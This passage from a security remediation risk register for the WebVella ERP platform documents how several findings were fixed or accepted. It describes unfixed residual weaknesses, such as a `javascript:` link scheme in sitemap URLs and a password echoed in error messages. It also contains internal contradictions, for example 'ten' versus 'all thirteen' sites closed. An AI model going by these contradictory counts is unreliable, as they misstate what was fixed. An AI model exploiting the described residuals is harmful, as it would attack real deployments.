`WebVella.Erp.Site` uses three localhost origins, while `WebVella.Erp.Site.Project` adds the Stencil
client at `http://localhost:2202` as its fourth. The full resolution table is in the
[secure configuration guide](secure-configuration.md#cross-origin-policy). An earlier revision of
Project denied every origin in *every* environment, including `Development`, because nothing in the tree
supplied the key; that over-denial was itself a review finding, and it is recorded in the
[remediation log](remediation-log.md#project-host-cross-origin-supply-path-frontend-01).

Three properties of the fix are worth recording, because each was a decision rather than a default.

* **`AddDefaultPolicy` was kept rather than converted to a named policy.** Each of the two hosts already
  calls `app.UseCors()` with no policy name, which applies the default policy. Keeping the registration
  shape meant the request pipeline needed no edit at all, which is the smallest change that closes the
  finding.
* **`AllowCredentials()` is deliberately absent.** The framework refuses it alongside a wildcard origin,
  and these two hosts authenticate cross-origin callers with a bearer token rather than with a cookie,
  so adding it would widen the policy without serving a caller that exists.
* **Ordering was verified, not assumed.** `UseCors` sits ahead of `UseHsts` and `UseHttpsRedirection` in
  every host precisely because HTTPS redirection answers a preflight with a redirect the browser rejects
  as invalid. With redirection active, an `OPTIONS` preflight from a listed origin over **plain HTTP**
  answered `204` with the full `Access-Control-Allow-*` set and no `Location` header, while a
  non-preflight plain-HTTP `GET` still answered `307`. Both halves hold simultaneously.

The verification also recorded the shape of a *refusal*, because it is easy to misread: an origin
outside the allow-list still receives the normal response status and body, and simply receives **no**
`Access-Control-Allow-Origin` and no `Vary: Origin`. The absence of the header is the control; CORS is
enforced by the browser, not by the server declining to answer.

**What is not closed by this entry:** the allowed origins are hard-coded localhost values in **five** of
the seven hosts. They are development defaults, and an allow-list naming the wrong origins protects
nothing. That is a deployment task, recorded under *ongoing recommendations*. `WebVella.Erp.Site` and
`WebVella.Erp.Site.Project` are no longer among them: both lists are supplied through
`Settings:Cors:AllowedOrigins`, so they are deployment configuration rather than source edits, and both
deny every origin when that key is unconfigured outside `Development`.

### RISK-014 — Closed: the anonymous bearer-token error paths no longer return exception text

| Field | Value |
| --- | --- |
| **Status** | **Closed.** |
| **Related finding** | H-13 (CWE-209 generation of an error message containing sensitive information, OWASP A05:2021) |
| **Owner** | Platform team |

Both `[AllowAnonymous]` bearer-token routes in `WebVella.Erp.Web/Controllers/WebApiController.cs` — token
issue and token refresh — concatenated the exception message and the full stack trace into the response
body, guarded by no development-mode check, so setting `Production` did not suppress them. Both now
return `An internal error occurred!` outside Development. Two details make the closure sound rather than
cosmetic:

* **The server-side record is retained unchanged.** The `LogService` write that precedes each response is
  untouched, so the diagnostic detail is still captured; only its audience changed.
* **The issue route keeps the platform's own credential wording for a rejected credential**, so that
  outcome stays byte-identical to a throttle rejection. Diverging there would have converted two
  different messages into an account-existence oracle — closing a disclosure finding by opening an
  enumeration one.

In Development the response carries `e.ToString()`, which renders the type, message, inner exceptions and
stack trace. That is a superset of what was emitted before, so a developer loses nothing.

**Update — a third unconditional site of this class was later found, on the authentication path, and is
also closed.** This entry and `RISK-032` between them accounted for the bearer-token routes and the ten
authenticated API actions, which left the impression that the unconditional-disclosure surface had been
fully enumerated. It had not. Review finding `CR2-F-08` (recorded as `P-11`) found the same pattern in
`WebVella.Erp.Web/Pages/login.cshtml.cs`: the `catch` around the pre-login hook loop assigned `ex.Message`
straight into the page's own error banner, and that page is `[AllowAnonymous]`. It was **worse-placed**
than the two routes this entry covers, because hooks are plugin extension points executing with full
platform access, so their faults carry connection strings, SQL fragments, absolute paths and
configuration keys — and any unauthenticated visitor could provoke them by posting the login form. It is
now closed on the same principle this entry describes: the server-side record is retained in full through
`SecurityAuditLog.RecordApiFault`, so only the audience changed, and the response carries the handler's
existing generic refusal message so the outcome stays byte-identical to a wrong credential and to a
throttle rejection — avoiding exactly the enumeration oracle the second bullet above warns about. The
enumeration lesson is recorded rather than the count merely corrected: a disclosure class is not closed
when its *routes* are closed, only when every sink of that shape is, and the authentication path was
missed by both the audit and the first review round.

### RISK-036 — The session-revocation store is in-process

| Field | Value |
| --- | --- |
| **Status** | Accepted — one bounded residual of the control that closes `RISK-007`. The second residual this entry used to record (pre-existing credentials being exempt from revocation) was closed by review finding `CR2-F-01`; see the update at the end. |
| **Related finding** | Review finding `F8` (session hijacking), then `CR2-F-01` / `CR2-F-02`; H-02 / H-03 (CWE-613, OWASP A07:2021) |
| **Owner** | Platform team |

`WebVella.Erp.Web/Services/SessionRevocationService.cs` holds revoked session identifiers in a bounded
process-wide `MemoryCache`. That choice is what allowed `RISK-007` to be closed at all: a persisted
revocation list would have required the database schema change the remediation constraints forbid
outright. The cost is stated plainly rather than discovered later.

* **It does not survive a restart.** After an application restart, a cookie whose session was revoked
  before the restart authenticates again, because the record of the revocation is gone. The bound on that
  exposure is the ticket's own eight-hour expiry, not the revocation.
* **It does not span instances.** Behind a load balancer, a sign-out served by one instance is not known
  to the others. Each instance enforces its own view. Sticky sessions, or a shared store, are required
  before scaling out. This is the identical shape as `RISK-008` for login throttling, and one shared store
  would serve both.
* **It is bounded to 20,000 identifiers with a 20% compaction step**, which is a deliberate denial-of-service
  boundary — an unbounded revocation list is a memory-growth primitive reachable by repeated sign-out. The
  bound was verified rather than assumed: after 25,000 revocations the store held exactly 20,000 entries.
  The consequence is that under extreme sign-out volume the *oldest* revocations are evicted first, which
  is the correct direction, because the oldest tickets are also the closest to expiring on their own.
* **Retention is clamped at both ends** — a minimum of one minute and a maximum of 24 hours — so a
  malformed or hostile expiry value can neither create a permanently retained entry nor produce an entry
  that is evicted before it can be observed.

**Update — the transitional residual is closed, and the reversal is deliberate.** This entry previously
recorded a second residual: credentials minted *before* the control shipped carry no `erp_session_id`
claim, and the checks treated an absent claim as *not revoked* rather than as a refusal, so that nobody
would be signed out at deployment. Review finding `CR2-F-01` established why that was the wrong trade. The
exemption was not transitional in effect but permanent in reach: nothing expired it, nothing verified
that such credentials really were bounded in the way the entry asserted, and any future path that
produced a credential without the claim — an older build behind the same load balancer, a ticket restored
from a backup, a re-used data-protection key ring — inherited a session that revocation could never end.
Both checks now **fail closed**: a credential carrying no parseable session identifier is rejected and
signed out. The measured cost is one re-authentication per in-flight session at deployment, which is
accepted as the price of a control that has no bypass, and it is stated in
[credential-migration.md](credential-migration.md) so operators expect it.

Two design properties are recorded because they are what stop the control becoming a weapon:

* **`Guid.Empty` can never be revoked.** `RevokeSessionIdentifier` ignores it and
  `IsSessionIdentifierRevoked` always returns false for it, so no entry can exist that would match every
  credential whose claim failed to parse. That cannot be used as a global kill switch, and it is not a
  leniency either: a credential presenting an empty or unparseable identifier is refused by the callers
  before the store is ever consulted.
* **The store is process-wide static rather than injected**, which finding `CR2-F-02` required: the bearer
  validators are static code with no service provider in reach, so an injected store was unreachable
  from them. Two properties follow, and both are strengthenings rather than costs — there is exactly one
  store per process instead of one per service provider, and no consumer has to interpret an
  unresolvable service, a state that used to be indistinguishable from "this session is not revoked".
* **The hook composes with, rather than replaces, any host-supplied `OnValidatePrincipal`.** The previously
  configured delegate is captured and invoked first, and a principal it has already rejected is left
  rejected. No host sets one today; the composition is there so that a future host adding one does not
  silently disable session revocation.

### RISK-037 — Sitemap node URLs are encoded but their scheme is not validated

| Field | Value |
| --- | --- |
| **Status** | Named, not fixed — reasoned decline. |
| **Related finding** | H-06 / review finding `F15` (CWE-79, OWASP A03:2021) |

`node.Url` is interpolated into an `href` attribute by the sitemap builder in
`WebVella.Erp.Web/Models/BaseErpPageModel.cs`. It is now HTML-encoded, which closes the half of the
weakness the finding actually describes: a stored value can no longer terminate the attribute or the
anchor and inject sibling markup. It does **not** close a different half — a value whose *scheme* is
`javascript:` still runs when a user activates the link, because a browser HTML-decodes an attribute
value before it parses the scheme.

**Why this is declined rather than fixed here.**

* The finding is markup breakout, and the control for markup breakout is encoding. Adding scheme
  filtering in the same edit would be a second, differently-shaped control for a weakness class the
  finding does not raise, which the minimal-change constraint forbids.
* A sitemap node URL is legitimately allowed to be a non-`http` scheme. `mailto:` and `tel:` entries
  are ordinary navigation targets, and the encoder demonstrably preserves both — `tel:+15551234567`
  round-trips through `tel:&#x2B;15551234567` back to the dialable original. An allow-list narrow
  enough to stop `javascript:` would have to enumerate every scheme an operator might legitimately
  have configured, and getting that list wrong breaks working navigation, which the
  functionality-preservation requirement forbids.
* The exposure requires the ability to **author a sitemap node**, which is an administrative
  capability. It is therefore a privilege-holder risk rather than an anonymous or ordinary-user one,
  which is materially different from the stored-record risk the finding describes.

**What an operator should do.** Treat sitemap authoring as a privileged operation and review stored
node URLs for non-navigational schemes. The precedent for the stricter control already exists in this
engagement: the reflected return-URL sinks are validated as same-site local URLs rather than encoded,
precisely because a scheme is what mattered there. Applying that same validation to sitemap nodes is
the recommended future work, and it is a policy decision about which schemes the product intends to
support — which is why it sits with the repository owner rather than being taken unilaterally.

### RISK-038 — Encoded output is render-equivalent but not byte-identical for four value shapes

| Field | Value |
| --- | --- |
| **Status** | Accepted. |
| **Related finding** | H-06 / review finding `F15` (CWE-79, OWASP A03:2021) |

`HtmlEncoder.Default` is deliberately conservative. Four legitimate shapes come out changed:

| Input shape | Encoded form | Consequence |
| --- | --- | --- |
| `&` — a query-string separator inside a URL | `&amp;` | The correct HTML spelling of `&`. Identical after the browser decodes the attribute. |
| `'` — an apostrophe in a label, e.g. `O'Brien & Sons` | `&#x27;` | Renders as an apostrophe. |
| `+` — e.g. `tel:+15551234567` | `&#x2B;` | Renders and dials as the original. This one was **not** anticipated and was found by the verification harness rather than by reading the documentation. |
| Any non-ASCII character | A numeric character reference, e.g. `Проекти` → `&#x41F;&#x440;&#x43E;&#x435;&#x43A;&#x442;&#x438;` | Decodes losslessly and renders identically; only the byte count grows. |

Every one of these is **render-equivalent**, and each is asserted in both directions by the
verification harness: that the rewrite occurs, and that it decodes back to the original input. A
browser HTML-decodes an attribute value before using it, so a link, a mail address and a telephone
number all behave exactly as before.

**What is accepted.** A consumer that reads the *composed markup string* rather than parsing it as
HTML would observe the difference — for example a test asserting on a literal `&` in a generated
`href`, or a downstream string comparison against a stored URL. No such consumer exists in the
repository today; the composed values are rendered by Razor and parsed by the browser in every case.
The residual is recorded so that a future consumer of this markup as text is designed with the
encoding in mind rather than surprised by it.

A second, narrower consequence is recorded in the same place because it looks like a defect and is
not: when a **payload** attempts to break out of a `class` attribute, the trailing quote it injects is
absorbed into the class token, producing an invalid CSS class such as `fa-database"`. The icon for
that one row then does not render. Legitimate icon values are unaffected — eleven of them are asserted
to survive byte-identically, and a live browser run confirmed every legitimate glyph paints, including
the widget priority icons whose glyph code points and inline colours were read back intact. The
missing glyph is the visible signature of a payload being trapped inside an attribute value, which is
the fix working.

### RISK-039 — Stored output encoding is enforced by the builders, and nothing in the compiler enforces it

| Field | Value |
| --- | --- |
| **Status** | Accepted. |
| **Related finding** | H-06 / review finding `F15` (CWE-79, OWASP A03:2021) |

The stored sinks are closed in the code that **composes** the markup, not in the views that render
it, and the views still call `Html.Raw`. That placement is forced:
`WebVella.Erp.Web/Pages/Shared/NavItem.cshtml:L9` rewrites the finished anchor string by
string-replacing `"<a"`, so encoding in the view would stop that rewrite matching and every dropdown
in the product would stop toggling. `MenuItem.IsHtml` defaults to `true` and is never assigned
`false` anywhere in the repository, so the raw branch is the only branch ever taken and the
auto-encoded `else` branch is unreachable in practice.

**The residual.** A future edit that adds a new interpolation to one of those builders, or a new
builder that feeds the same views, can reintroduce the sink. Nothing in the type system prevents it,
because the value being interpolated is an ordinary `string` either way. Three controls stand in for
a compiler guarantee, and they are stated plainly as what they are:

* Every edited view carries a comment saying the sink is closed at the builder, naming the builder,
  and instructing the reader not to remove the raw call and not to encode there.
* The verification harness includes a **source-invariant** section that reads the four real builder
  files, walks every interpolation hole in the marker template lines, and fails if any hole
  references something other than an encoded local or a cast identifier. That check is what would
  catch a regression, and it lives in the harness rather than in the build, so it only runs when the
  harness is run.
* This entry, so the constraint is discoverable from the documentation rather than only from a
  comment.

**Recommended future work.** A single audited encoding helper would make the invariant local and
reviewable, but it cannot be shared today: `WebVella.Erp.Web` and
`WebVella.Erp.Plugins.Project` are separate assemblies, so a shared helper means new public API
crossing an assembly boundary — which the change constraints forbid for a control that is otherwise a
one-token call. Introducing it belongs with a change that is already permitted to add public surface.

### RISK-040 — The two plugin controllers are guarded but not logged

| Field | Value |
| --- | --- |
| **Status** | Named, not fixed — recommended. |
| **Related finding** | H-13 / review finding `F26` (CWE-209, OWASP A05:2021) |

Ten `catch` blocks across the two plugin controllers previously assigned `ex.Message` straight
into the response body: seven in `WebVella.Erp.Plugins.SDK/Controllers/AdminController.cs` at
lines 89, 141, 186, 259, 363, 408 and 509, and three in
`WebVella.Erp.Plugins.Project/Controllers/ProjectController.cs` at lines 323, 391 and 456. All
ten now return the platform's generic message outside Development posture and the exception
text only inside it, which is the same guard the rest of the tree uses. What they do **not** do
is write a server-side log record, so outside Development the fault detail is not merely
withheld from the caller: it is not retained anywhere.

**Why it was left that way.** Neither file contains a logging call of any kind, in any method,
at any revision in this engagement's history. Introducing one means choosing a source-name
convention, a rate bound and a notification posture for files that have never had them, which
is design work rather than remediation, and the change scope forbids exactly that. Withholding
the detail from the response is the security fix; retaining it server-side is an observability
improvement that happens to share the same lines.

**Recommended fix.** Route these ten sites through
`WebVella.Erp.Web.Services.SecurityAuditLog.RecordApiFault`, which already provides the
source-keyed rate bound, the fixed non-notifying category and the JSON-encoded detail column.
It is `internal` to `WebVella.Erp.Web` today, so the change also requires deciding whether the
plugins should see it — a public-surface decision, which is precisely why it is recorded
here rather than taken unilaterally.

### RISK-041 — The fault sink retains the count of suppressed repeats, not their detail

| Field | Value |
| --- | --- |
| **Status** | Accepted. |
| **Related finding** | H-13 / review findings `F9` and `F26` (CWE-209, CWE-779, OWASP A05:2021 and A09:2021) |

`WebVella.Erp.Web/Utils/SecurityAuditLog.cs` persists at most one fault record per source
per minute — `FaultIntervalMinutes = 1`, claimed through `TryClaimWindow` in `RecordApiFault`, with
suppressed repeats counted rather than written. (An earlier revision placed this type under
`Services/`; it lives under `Utils/` and is 690 lines.) That bound is the point of the control:
reachable without credentials, so an unbounded log write on their failure path is itself a
denial-of-service primitive — against the database through row volume, and against the
operator through evidence volume.

**The residual is deliberate and is stated as a trade, not as a win.** Within a suppression
window the second and subsequent occurrences are counted but their individual stack traces are
discarded. The count is not silently dropped: the next write from that source carries an
accompanying `LogType.Info` accounting record under the fixed source `SecurityAuditLog`, whose
details read `source=…; suppressed_by_rate_limit=N; not_persisted=M`, so an operator reading
the log can always tell that suppression happened and by how much. If the store itself fails,
the same accounting mechanism reports `not_persisted` and the record is additionally emitted
through `System.Diagnostics.Trace.TraceError`, so a database outage degrades the sink to a
different channel rather than to silence.

**Two narrower properties worth knowing.** The bounding state is a private
`ConcurrentDictionary` in the hosting process, so behind a load balancer each instance keeps
its own window and the effective rate is one record per minute per source *per instance* —
the same in-process limitation already recorded for login throttling as `RISK-008` and for
session revocation as `RISK-036`. And the table of tracked sources is capped at 64 entries;
beyond that, further source names share a single overflow budget, which fails toward
suppressing rather than toward unbounded growth.

**Not bounded, deliberately.** `RecordAudit` — the authentication audit path — is
explicitly *not* rate bounded, because every login attempt is itself the evidence. The volume
on that path is bounded upstream by `LoginThrottleService` instead.

### RISK-042 — Thirteen SDK developer-tool pages surface a system message through validation

| Field | Value |
| --- | --- |
| **Status** | Named, not fixed — out of scope, with a recommended fix. |
| **Related finding** | H-13 / review finding `F26` (CWE-209, OWASP A05:2021) |

The solution-wide sweep that closed the information-disclosure class classified every
`response.Message = ex.Message` assignment in the tree by whether an
`ErpSettings.DevelopmentMode` guard stood within five lines of it. Twenty-nine sites were
already correctly
guarded and were deliberately left untouched — recording them matters, because they read
like defects and are not. Thirteen were genuinely open. Ten were closed.

All thirteen were closed, including the three in
`WebVella.Erp.Plugins.Project/Controllers/ProjectController.cs` at lines 323, 391 and 456 that
an earlier draft of this register proposed to defer. Deferring them was rejected on review: the
finding they belong to names raw-message sites as a class, and a class is not closed while a
member of it is open, however convenient the file-editing arithmetic. A fourth textual match in
that file, at line 356, is **commented out** and is not a sink; it is named here so a future
reader counting four does not conclude one was missed, and the verification harness asserts it
stays inert rather than being "fixed".

**What genuinely remains, and why it is a different thing.** A wider sweep — broadened from
response assignments to *any* exception text reaching *any* caller-visible channel — found
thirteen further sites, all of the same shape:

```csharp
Validation.Errors.Add(new ValidationError("", ex.Message, isSystem: true));
```

They are in the SDK plugin's Razor Page models for the entity, field, relation and user
editors. Three properties separate them from the sites this class closed. **The mechanism is
different:** these travel the platform's `ValidationError` collection into a rendered page, not
a JSON envelope, and the immediately preceding `catch (ValidationException)` clause in each file
uses the identical call for *legitimate* validation feedback — so the two cannot be
separated by pattern alone. **The consumer is different:** the SDK developer tooling is reached
only by an authenticated administrator on the SDK host, and the message is what makes a failed
schema edit diagnosable; suppressing it makes the editor report that something went wrong
without saying what. **The files are different:** none of them is in this change's file scope,
and thirteen page models across four editors is a change surface out of proportion to a Medium
finding whose named locations are all in one controller.

**Recommended fix.** Gate the `isSystem: true` message on `ErpSettings.DevelopmentMode` in the
generic `catch` only, leaving the typed `ValidationException` clause untouched, and pair it with
a bounded server-side record so the detail is relocated rather than discarded. That is the same
shape as the fix applied here, and it should land with a change that is already editing the SDK
page models.

**Two classes of match that are not findings**, recorded so a future sweep does not re-raise
them. Seven matches in the Project plugin's dated provisioning files are `ex.Message` occurring
inside **escaped JSON string literals** of seeded page-component source code — data, not
code. And `WebVella.Erp/Diagnostics/Log.cs:L95` composes `details + ex.Message` into the
**JSON details payload** of a log record, which is a server-side store rather than a response,
and which is serialised by `JsonConvert` so control characters are escaped by construction.

### RISK-043 — An administrator debugging a data source sees less in Production

| Field | Value |
| --- | --- |
| **Status** | Accepted. |
| **Related finding** | H-13 / review finding `F26` (CWE-209, OWASP A05:2021) |

Thirty-six response sinks in `WebVella.Erp.Web/Controllers/WebApiController.cs` previously
returned `ex.Message`, and ten of those returned `ex.Message + ex.StackTrace`. All thirty-six
now route through one `SafeErrorMessage` helper that returns the platform's fixed
`An internal error occurred!` string outside Development posture. The operability consequence is
real and is recorded rather than glossed: an administrator using the SDK data-source test tool,
or any of the record and schedule-plan actions, no longer sees the .NET exception text for an
**unexpected** fault.

**What is unaffected.** Authoring feedback is not carried by those sinks. The two data-source
actions and the EQL action each declare a `catch (EqlException)` clause **before** the generic
one, and that clause copies the parser's own structured error list into the response untouched.
This was verified at runtime rather than reasoned about: a query naming an unknown entity still
answers `Entity 'no_such_entity_xyz' specified in FROM clause not found.`, while a malformed
query that previously leaked `Object reference not set to an instance of an object.` now answers
the generic message. Record validation is likewise unaffected, because `RecordManager` *returns*
validation errors in the response rather than throwing them.

**Where the detail went.** Nowhere. Twenty-eight of these paths write a `system_log` record
whose JSON details column carries the message, the stack trace, the source and the inner
exception — byte-identical to what was persisted before, because the same
`Log.MakeDetailsJson` builder produces it. The detail is readable through the platform's own log
viewer by anyone who could previously have read it from an HTTP response, and it is no longer
readable by anyone who could not. Setting `Settings:DevelopmentMode` restores the old response
behaviour in full for a development host.

### RISK-044 — The schedule manager still writes notification-eligible error records

| Field | Value |
| --- | --- |
| **Status** | Named, not fixed — out of scope. |
| **Related finding** | M-17 / review finding `F9` (CWE-779, OWASP A09:2021) |

`WebVella.Erp` schedule processing writes its failures through `LogService` with the default
notification status, which means every failure is e-mailed before it is persisted. Observed live
while probing an unrelated control: eight records within a few minutes, all reporting
`Schedule plan 'Start tasks to process SMTP email queue' failed to create job.`, all with the
notifying status. A plan that fails on every tick therefore produces mail on every tick.

**Why it is not the vector the remediation closed.** The amplification finding is specifically
about paths an **unauthenticated caller can drive**. This is a background timer: its rate is set by
the schedule interval, not by request volume, so no caller — anonymous or authenticated —
can turn it into a flood on demand. Its worst case is bounded by the tick rate and is a noisy
mailbox rather than a denial-of-service primitive. It is recorded because it is the same *shape* of
defect in a different place, and because anyone grepping for notifying log writes after reading the
remediation will find it and is entitled to know it was seen rather than missed.

**Recommended fix.** Either give the schedule manager the same bounded non-notifying sink the
request paths now use, or — the smaller change — make `LogService` persist before it
notifies, which is the fix already recommended for `M-17` and which would bound the damage of every
notifying call site at once rather than one at a time.

### RISK-045 — A plaintext credential can still reach an exception message at the per-field collector

| Field | Value |
| --- | --- |
| **Status** | Named, not fixed — pre-existing, and not reachable through the path this engagement added. |
| **Related finding** | Review finding `F25` (CWE-521), adjacent to CWE-532 |

The per-field value collector in `WebVella.Erp/Api/RecordManager.cs` wraps each field conversion in a
`try`/`catch` and, on failure, records a validation error whose message interpolates the **submitted
value**: `Invalid value: '<value>'`. For every ordinary field that is exactly the right diagnostic. For
a `PasswordField` it is a plaintext credential in an API validation message and, in Development
posture, in an HTTP response body.

**Why the policy fix did not arm it, and why that was a design decision rather than luck.** The
obvious way to enforce a password policy inside a collector is to throw from the field branch. Doing
that here would have routed every policy refusal straight through this catch, so a fix for CWE-521
would have manufactured a CWE-532 disclosure on the same line. The pre-pass is therefore a
**reporting** pre-pass: it runs before any field conversion, adds an `ErrorModel` keyed `password`
with `Value` deliberately left unset, and lets the collector's own `if (response.Errors.Count > 0)`
early return refuse the write.

**Verified live rather than argued.** A distinctive six-character candidate submitted to
`POST api/v3/en_US/record/user` on a published Production-posture host was refused with
`Password must be at least 12 characters long.`; the candidate appeared **nowhere** in the 217-byte
response body and in **no** `system_log` row. A six-character probe was used on purpose: the first
attempt used a one-character password and the substring test reported a false positive, because `a`
occurs inside `at least`.

**What remains.** Any conversion failure on a password field that is *not* a policy failure — a
malformed JSON value for that field, for instance — still reaches the interpolating catch.

**Recommended fix.** Two small options, either sufficient: exclude `PasswordField` from the
interpolated message and emit the field name alone, or stop interpolating the value in that message
altogether and rely on the field name, which is what the caller needs in order to correct the request.

### RISK-046 — The password policy floor is deliberately absent from the hashing primitive

| Field | Value |
| --- | --- |
| **Status** | Accepted — a structural invariant, documented in the source and pinned by verification checks. |
| **Related finding** | Review finding `F25` (CWE-521); interacts with `C-03` |

Two bounds live in `PasswordUtil` and they are **not** the same kind of rule:

| Bound | Kind | Where it is enforced |
| --- | --- | --- |
| `MaxPasswordLength` (128) | **Resource** bound — caps the work an attacker can ask a key-derivation function to do | Everywhere, including `HashPassword` and both verify paths |
| `MinPasswordLength` (12) plus the complexity rules | **Policy** floor — governs what a human may *choose* | Only at the four credential-choice boundaries |

`SecurityManager.UpgradeStoredPasswordHash` re-hashes a legacy MD5 credential at the moment its owner
successfully authenticates with it. That plaintext was chosen years ago under the old 6-character
policy. If the floor were enforced inside `HashPassword`, or added to the upgrade path, the migration
would throw for precisely the accounts it exists to rescue — and it would throw **silently**,
because that call site logs and swallows its failures by design so that a rehash problem can never
turn a valid login into a failed one. The user would keep logging in, would keep an MD5 digest
forever, and nothing would say so.

The omission is documented in the source at the point where a maintainer would be tempted to remove
it — the `MinPasswordLength` declaration carries an explicit *do not tidy this down into
`HashPassword`* warning — and it is pinned by verification checks that assert the primitive does
**not** reference the validator and that the comment explaining why is still present. Tidying it away
fails a check rather than a login.

**Recommended fix.** None. Raising the floor for an existing user is an operational decision — a
forced-reset campaign — not a code change, and forcing it through the migration path would lock
users out.

### RISK-047 — Two exemptions in the record-write password pre-pass are load-bearing

| Field | Value |
| --- | --- |
| **Status** | Accepted. |
| **Related finding** | Review finding `F25` (CWE-521); interacts with `C-02` |

The pre-pass that guards `RecordManager.CreateRecord` and `RecordManager.UpdateRecord` skips exactly
two values, and both exemptions carry weight:

| Exempt value | Why | What would break without the exemption |
| --- | --- | --- |
| Blank (`null`, empty, whitespace) | Both collectors already read a blank password as *leave the stored value alone* on update, and as *use the declared default* on create. It is never a chosen credential. | Every record update that does not set a password — which is almost all of them — would be refused. |
| `__WV_REDACTED_a7f3c1e9__` | The read-side redaction marker introduced for `C-02`. A client that reads a user record, edits one unrelated field and posts the whole record back sends the marker where the hash used to be. It never saw the real hash. | Every full-record round-trip update on the user entity would be refused, and the alternative — accepting it as a password — would replace the stored hash with a literal marker string. |

Neither exemption can produce a stored credential: both collectors drop these values **before** the
hashing branch, so an exempted value is never hashed and never written. Both are asserted by
verification checks that confirm a refusal leaves the stored hash byte-identical, and that the
exempted values are accepted while every non-compliant value is refused.


### RISK-048 — The anonymous script endpoint is constrained but still anonymous

| Field | Value |
| --- | --- |
| **Status** | Accepted — the `M-10` decline is preserved deliberately; everything reachable *through* the exemption is closed. |
| **Related finding** | Review finding `F27` (CWE-20, CWE-117, CWE-779); audit finding `M-10` (CWE-306, CWE-200) |

`TimeTrackJs` in `WebVella.Erp.Plugins.Project/Controllers/ProjectController.cs` still carries
`[AllowAnonymous]`, so two static JavaScript resources are served without credentials. That is audit
finding `M-10`, a Medium that compensates for no confirmed Critical or High, and under the governing
rule for this engagement it stays documented rather than fixed. Removing the attribute would break the
two shipped project pages that load these scripts.

What review finding `F27` closed is everything the exemption could be used to *reach*, which is where
the real exposure was:

| Was reachable | Now |
| --- | --- |
| The resource lookup, with any caller-supplied name | An exact two-entry map; the **value**, never the caller's string, reaches the lookup |
| The log source, by string concatenation | A fixed literal plus the canonical name; the caller's string cannot enter a log record at all |
| The log **volume**, one record per request | Refusals write nothing; faults are latched to one record per canonical name per process |
| The outbound mail path, because records default to notification-eligible | `LogNotificationStatus.DoNotNotify` |
| The platform error pipeline, by re-throw | Not re-thrown; a fault degrades to an empty script |

**What residual actually remains.** An unauthenticated caller can still fetch two static scripts and
can still consume request capacity doing so. The scripts contain no secret and no data — they are the
timer and task-watch client code that the shipped pages need — and refusals now cost a dictionary
lookup and a zero-byte response, so the endpoint is no longer an amplifier. The recommended eventual
fix is unchanged: move the action behind an explicit read-only policy, or serve the two files as
ordinary static assets and delete the action.

**Verified.** Sixty consecutive refusals over HTTPS against a published host in Production posture
added zero `system_log` rows, and no row anywhere named any probe string. Fourteen distinct hostile
names — traversal, a fully-qualified resource name, a script tag, a CRLF log-injection payload, a
null-byte suffix, a nested path, a 4,000-character name — each returned `200` with a zero-byte body.


### RISK-049 — The configuration probe still accepts a stale lower-case duplicate

| Field | Value |
| --- | --- |
| **Status** | Accepted — a deliberate compatibility choice with an operational consequence worth knowing. |
| **Related finding** | Review finding `F30` (CWE-16) |

All four configuration builder sites now **prefer** `Config.json` and fall back to `config.json` only
when the correctly cased name is absent. The fallback is not indecision. Before this fix the platform
asked for the lower-case name, so every deployment produced by the publish tooling — which wrote a
lower-case duplicate specifically to satisfy it — carries that name. A fix that started refusing those
directories would have replaced one startup failure with another, which is the opposite of what a
finding about startup availability should produce.

**The residual.** A deployment directory that has *lost* `Config.json` but still holds an old
`config.json` will start from the old file, silently, with whatever values that file carried. Because
every secret value in a shipped file is blank and the real values arrive from the environment, the
practical blast radius is limited to non-secret settings — `DevelopmentMode`, the timezone name, the
CSP enforcement switch — but `DevelopmentMode` is exactly the setting where a stale `true` matters.

**What to do about it.** Deployment steps that copy `Config.json` to `config.json` are no longer
needed and should be **removed**, so that only one file exists and the question cannot arise. Do not
solve it by adding a lower-case `config.json` beside `Config.json` in the *source* tree: MSBuild item
identity is case-insensitive, the two names collide, and the build fails with `NETSDK1022`.

**Verified.** A published web host was started with the lower-case duplicate deleted and only
`Config.json` present — the discriminating test, because with both names present the original defect is
invisible. It started normally. The console host was additionally run from a working directory
containing neither name, proving resolution is anchored to the application rather than to the working
directory.


### RISK-050 — The version 4 migration removes Guest grants unconditionally, once

| Field | Value |
| --- | --- |
| **Status** | Accepted — deny-by-default takes precedence over a preserved delegation, at the one ladder crossing. |
| **Related finding** | Review finding `F17` (CWE-200, CWE-732); audit findings `C-02` and `C-05` |

**What this entry used to describe, and why it changed.** A previous revision was titled "The version 5
migration removes Guest grants unconditionally" and described a `MigrateSecurityDefaults5` method plus an
always-on `ReconcileGuestRecordPermissions` pass that re-asserted the revocation on **every** start. All
three — the `if (currentVersion < 5)` block, the method and the reconciliation call — have been
**withdrawn**, because the frozen plan of record sets the migration ladder head at **4** and treats the
re-assertion as a Medium-tier concern to be documented rather than remediated. The ladder head is therefore
4, and nothing re-asserts anything on start-up.

**What remains, stated precisely.** `RevokeGuestRecordPermissions4` removes the **Guest** role from
`CanCreate` and `CanRead` on the `user` entity, and from `CanCreate` on the `role` entity, using
`RemoveAll` and without asking whether the grant was seeded or added later. It runs **once**, when an
installation recording a version below 4 crosses the ladder.

**The consequence for an operator.** An operator who deliberately re-granted Guest access *before* that
crossing will lose the grant at it. This is the same shape as `RISK-034` for the SMTP permission
migration, and it is resolved the same way: an anonymous grant on the entities that define accounts and
roles is precisely what the mandated Authorization Enforcement standard's deny-by-default clause
prohibits, so the migration takes precedence over the delegation. Nothing else about either entity is
touched — every scalar and the other two permission lists are read back from the stored definition and
written through unchanged, and the field collection is not part of the update at all. An operator who
genuinely needs anonymous role enumeration should expose it through a purpose-built read endpoint rather
than by granting the Guest role read on the metadata entity. **After the crossing, a re-grant is
preserved**, because the block never runs again — which is the substantive behavioural difference from the
withdrawn version-5 design.

**The residual the withdrawal leaves, and it is real.** A recorded version of 4 is not proof that the
version-4 body ever executed against that database: a restore from a mixed-version estate, a hand-edited
settings row, or a version advanced by a build that predated the fan-out all produce a database recording
4 while still carrying the grants. That state was observed on a development installation. The version-5
design existed to repair it, and with that design withdrawn **the repair no longer happens
automatically**. Two things bound the residual. The Guest grants are absent from the *seed*, so no
newly-provisioned installation has them. And one specific residual is narrower than it looks: the `role`
entity's Guest **read** grant is deliberately left in place by the version-4 body, which is why finding
`F17` remains a documented Medium rather than a closed item.

**A side effect worth knowing about, which is not a migration at all.** An installation that replays the
SDK plugin patch `20201221` also loses the `role`-entity Guest read grant — not because any migration runs,
but because that patch restates the entity's full permission set and the Guest entry was removed from the
patch at source. Operators reconciling permission state after an upgrade should account for plugin patch
replay as a second, independent cause of change.

**Verified live, in three scenarios, against a real PostgreSQL instance.** A fresh provision carries no
